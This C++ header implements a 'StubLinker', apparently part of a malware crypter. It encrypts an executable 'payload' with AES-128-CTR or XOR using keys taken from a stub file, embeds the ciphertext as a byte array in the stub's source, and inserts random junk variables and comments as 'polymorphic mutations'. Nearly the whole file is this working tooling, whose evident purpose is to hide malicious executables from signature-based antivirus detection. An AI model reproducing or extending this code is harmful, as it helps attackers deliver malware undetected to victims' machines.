#pragma once

#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <random>
#include <algorithm>
#include <iomanip>
#include <cstdint>
#include <stdexcept>
#include <regex>
#include <map>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#endif

// OpenSSL is optional - fallback to simple XOR if not available
#ifdef HAVE_OPENSSL
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#endif

class StubLinker {
private:
    std::mt19937_64 rng;
    
    struct ExtractedKeys {
        std::vector<uint8_t> key;
        std::vector<uint8_t> nonce;
        std::string keyMarker;
        std::string nonceMarker;
        size_t keyPosition;
        size_t noncePosition;
    };

public:
    StubLinker() : rng(std::random_device{}()) {}

    // Extract encryption keys from a generated stub
    ExtractedKeys extractKeysFromStub(const std::string& stubFilePath) {
        std::ifstream file(stubFilePath, std::ios::binary);
        if (!file.is_open()) {
            throw std::runtime_error("Cannot open stub file: " + stubFilePath);
        }

        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        file.close();

        ExtractedKeys keys;
        
        // Look for KEY_ and NONCE_ markers in the stub
        std::regex keyPattern(R"(KEY_(\w+)\s*=\s*"([^"]+)")");
        std::regex noncePattern(R"(NONCE_(\w+)\s*=\s*"([^"]+)")");
        
        std::smatch keyMatch, nonceMatch;
        
        if (std::regex_search(content, keyMatch, keyPattern)) {
            keys.keyMarker = keyMatch[1].str();
            std::string keyDecimal = keyMatch[2].str();
            keys.key = decimalStringToBytes(keyDecimal);
            keys.keyPosition = keyMatch.position();
        } else {
            throw std::runtime_error("No KEY_ marker found in stub");
        }
        
        if (std::regex_search(content, nonceMatch, noncePattern)) {
            keys.nonceMarker = nonceMatch[1].str();
            std::string nonceDecimal = nonceMatch[2].str();
            keys.nonce = decimalStringToBytes(nonceDecimal);
            keys.noncePosition = nonceMatch.position();
        } else {
            throw std::runtime_error("No NONCE_ marker found in stub");
        }

        return keys;
    }

    // Link a stub with an executable by embedding encrypted payload
    bool linkStubWithExecutable(const std::string& stubPath, 
                               const std::string& executablePath, 
                               const std::string& outputPath) {
        try {
            // Extract keys from the stub
            ExtractedKeys keys = extractKeysFromStub(stubPath);
            
            // Read the executable to encrypt
            std::vector<uint8_t> executableData = readBinaryFile(executablePath);
            if (executableData.empty()) {
                throw std::runtime_error("Executable file is empty or unreadable");
            }

            // Encrypt the executable using extracted keys
            std::vector<uint8_t> encryptedData = encryptWithAES_CTR(executableData, keys.key, keys.nonce);
            
            // Read the stub template
            std::string stubContent = readTextFile(stubPath);
            
            // Embed the encrypted data into the stub
            std::string modifiedStub = embedEncryptedPayload(stubContent, encryptedData);
            
            // Apply polymorphic mutations
            modifiedStub = applyPolymorphicMutations(modifiedStub);
            
            // Write the final linked stub
            std::ofstream output(outputPath);
            if (!output.is_open()) {
                throw std::runtime_error("Cannot create output file: " + outputPath);
            }
            
            output << modifiedStub;
            output.close();
            
            return true;
            
        } catch (const std::exception& e) {
            std::cerr << "Error linking stub: " << e.what() << std::endl;
            return false;
        }
    }

private:
    // Convert decimal string back to bytes
    std::vector<uint8_t> decimalStringToBytes(const std::string& decimalStr) {
        std::vector<uint8_t> bytes;
        std::istringstream iss(decimalStr);
        std::string byteStr;
        
        while (std::getline(iss, byteStr, '.')) {
            if (!byteStr.empty()) {
                try {
                    unsigned long value = std::stoul(byteStr);
                    if (value <= 255) {
                        bytes.push_back(static_cast<uint8_t>(value));
                    }
                } catch (...) {
                    // Skip invalid bytes
                }
            }
        }
        
        return bytes;
    }

    // Read binary file
    std::vector<uint8_t> readBinaryFile(const std::string& filePath) {
        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) {
            throw std::runtime_error("Cannot open file: " + filePath);
        }

        return std::vector<uint8_t>((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
    }

    // Read text file
    std::string readTextFile(const std::string& filePath) {
        std::ifstream file(filePath);
        if (!file.is_open()) {
            throw std::runtime_error("Cannot open file: " + filePath);
        }

        return std::string((std::istreambuf_iterator<char>(file)),
                          std::istreambuf_iterator<char>());
    }

    // AES-128-CTR encryption
    std::vector<uint8_t> encryptWithAES_CTR(const std::vector<uint8_t>& data,
                                           const std::vector<uint8_t>& key,
                                           const std::vector<uint8_t>& nonce) {
#ifdef HAVE_OPENSSL
        // Use OpenSSL implementation if available
        return encryptAES_CTR_OpenSSL(data, key, nonce);
#else
        // Fallback to XOR encryption
        return encryptXOR(data, key);
#endif
    }

#ifdef HAVE_OPENSSL
    std::vector<uint8_t> encryptAES_CTR_OpenSSL(const std::vector<uint8_t>& data,
                                               const std::vector<uint8_t>& key,
                                               const std::vector<uint8_t>& nonce) {
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) throw std::runtime_error("Failed to create cipher context");

        std::vector<uint8_t> result(data.size());
        std::vector<uint8_t> iv(16, 0);
        std::copy(nonce.begin(), nonce.begin() + std::min(nonce.size(), iv.size()), iv.begin());

        if (EVP_EncryptInit_ex(ctx, EVP_aes_128_ctr(), NULL, key.data(), iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to initialize encryption");
        }

        int len;
        if (EVP_EncryptUpdate(ctx, result.data(), &len, data.data(), static_cast<int>(data.size())) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to encrypt data");
        }

        int finalLen;
        if (EVP_EncryptFinal_ex(ctx, result.data() + len, &finalLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to finalize encryption");
        }

        result.resize(len + finalLen);
        EVP_CIPHER_CTX_free(ctx);
        return result;
    }
#endif

    // XOR encryption fallback
    std::vector<uint8_t> encryptXOR(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
        std::vector<uint8_t> result(data.size());
        for (size_t i = 0; i < data.size(); ++i) {
            result[i] = data[i] ^ key[i % key.size()];
        }
        return result;
    }

    // Embed encrypted payload into stub
    std::string embedEncryptedPayload(const std::string& stubContent, const std::vector<uint8_t>& encryptedData) {
        std::string result = stubContent;
        
        // Convert encrypted data to C++ array format
        std::ostringstream payloadStream;
        payloadStream << "unsigned char encryptedPayload[] = {\n    ";
        
        for (size_t i = 0; i < encryptedData.size(); ++i) {
            payloadStream << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(encryptedData[i]);
            if (i < encryptedData.size() - 1) {
                payloadStream << ", ";
                if ((i + 1) % 12 == 0) {
                    payloadStream << "\n    ";
                }
            }
        }
        
        payloadStream << "\n};\n";
        payloadStream << "unsigned int encryptedPayloadSize = " << encryptedData.size() << ";\n";
        
        // Find payload insertion point (after includes)
        std::regex insertionPoint(R"(#include\s+<[^>]+>\s*\n)");
        std::smatch match;
        
        if (std::regex_search(result, match, insertionPoint)) {
            size_t insertPos = match.position() + match.length();
            result.insert(insertPos, "\n" + payloadStream.str() + "\n");
        } else {
            // If no includes found, insert at the beginning
            result = payloadStream.str() + "\n" + result;
        }
        
        return result;
    }

    // Apply polymorphic mutations to the stub
    std::string applyPolymorphicMutations(const std::string& stubContent) {
        std::string result = stubContent;
        
        // Add random junk variables
        std::ostringstream junkVars;
        for (int i = 0; i < 5; ++i) {
            std::string varName = generateRandomVariableName();
            junkVars << "int " << varName << " = " << (rng() % 1000) << ";\n";
        }
        
        // Insert junk variables before main function
        std::regex mainPattern(R"(int\s+main\s*\()");
        result = std::regex_replace(result, mainPattern, junkVars.str() + "\nint main(");
        
        // Add random comments
        for (int i = 0; i < 3; ++i) {
            std::string comment = "// " + generateRandomString(20) + "\n";
            size_t insertPos = rng() % result.length();
            result.insert(insertPos, comment);
        }
        
        return result;
    }

    // Generate random variable name
    std::string generateRandomVariableName() {
        const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        std::string result;
        result += chars[rng() % chars.length()]; // First char must be letter
        
        const std::string allChars = chars + "0123456789";
        for (int i = 1; i < 8; ++i) {
            result += allChars[rng() % allChars.length()];
        }
        
        return result;
    }

    // Generate random string
    std::string generateRandomString(size_t length) {
        const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        
        for (size_t i = 0; i < length; ++i) {
            result += chars[rng() % chars.length()];
        }
        
        return result;
    }

public:
    // Display help information
    static void showHelp() {
        std::cout << "\nStubLinker - Advanced Payload Embedding Tool\n"
                  << "============================================\n\n"
                  << "Usage:\n"
                  << "  linkStubWithExecutable(stubPath, executablePath, outputPath)\n\n"
                  << "Features:\n"
                  << "  • Extracts encryption keys from generated stubs\n"
                  << "  • Embeds encrypted executable payload\n"
                  << "  • Applies polymorphic code mutations\n"
                  << "  • AES-128-CTR encryption with fallback to XOR\n"
                  << "  • Automatic payload array generation\n\n"
                  << "Example:\n"
                  << "  StubLinker linker;\n"
                  << "  bool success = linker.linkStubWithExecutable(\n"
                  << "      \"generated_stub.cpp\",\n"
                  << "      \"payload.exe\",\n"
                  << "      \"final_stub.cpp\"\n"
                  << "  );\n\n";
    }
};